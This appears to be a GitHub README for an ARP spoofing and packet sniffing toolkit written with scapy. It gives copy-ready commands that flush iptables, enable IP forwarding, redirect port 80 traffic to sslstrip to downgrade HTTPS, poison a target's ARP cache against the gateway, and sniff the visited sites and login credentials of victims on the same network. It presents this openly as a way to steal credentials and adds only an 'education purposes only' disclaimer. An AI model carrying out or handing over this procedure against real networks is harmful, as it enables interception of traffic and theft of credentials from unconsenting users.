<h1 align="center">Spoofer-and-Sniffer</h1>
<hr>

## Project Description 📽️  
<br>
<p> Get the Code for understanding how ARP SPOOFER AND PACKET SNIFFER are made to get the information of other people surfing over same network and Also how the Credentials Get stolen over the internet. <br> ARP spoofer and packet sniffer are made using the scapy module. <br> These are some of tools used by professionals as well</p>
<br>
<hr>
<br>

## Usage 💻:


- **The further Steps are used for bypassing https requests**

Step 1: flush out the iptables
```
$ iptables --flush
```

Step 2: PORT FORWARDING ACTIVE:
```
$ echo "1" > /proc/sys/net/ipv4/ip_forward
```

Step 3: Redirect the incoming packets to sslstrip PORT 10000:
```
$ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port <yourListenPort>
```

Step 4: Open a New Terminal Window and run command:
```
$ sslstrip
```
<br>

- **Head over to Linux Command Line and Run the spoofer**
```
$ python3 arp_spoofer.py -t (target ip address) -g(gateway ip address)
```
(Run network_scanner given in my other Repository to get the target ip address ) ==> [Network_Scanner](https://github.com/shivdon/Network_Scanner-FOR-WINDOWS)
<br>

- **To Get the INFORMATION of Sites the victim is searching and also get the Credentials(If THEY ARE SIGNING UP/IN) to a website:
```
$ python3 packet_sniffer.py
```
<br>
<br>
<hr>
<h1 align="center">***FOR EDUCATION PURPOSES ONLY***</h1>
<hr>
